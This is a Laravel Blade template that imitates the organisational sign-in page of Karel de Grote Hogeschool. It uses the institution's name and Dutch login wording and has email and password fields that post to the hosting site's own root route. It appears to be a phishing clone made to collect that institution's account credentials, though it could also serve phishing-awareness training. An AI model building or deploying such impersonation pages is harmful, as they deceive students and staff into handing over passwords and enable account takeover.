@extends('layouts.app')

@section('content')


    <div class="kdg" alt="Image">
    </div>


<div class="content">
  <div class="kdgheader">Karel de Grote Hogeschool</div>
<div class="red">Aanmelden met uw organisatieaccount</div>
<form action="/" method="POST">
    <input id="userNameInput" name="UserName" type="email" value="" tabindex="1" class="text fullWidth" spellcheck="false" placeholder="iemand@example.com" autocomplete="off">
    <input id="passwordInput" name="Password" type="password" tabindex="2" class="text fullWidth" placeholder="Wachtwoord" autocomplete="off">
    <button id="submitButton" class="submit" type="submit" value="submit">Aanmelden</button>
</form>
</div>
@endsection
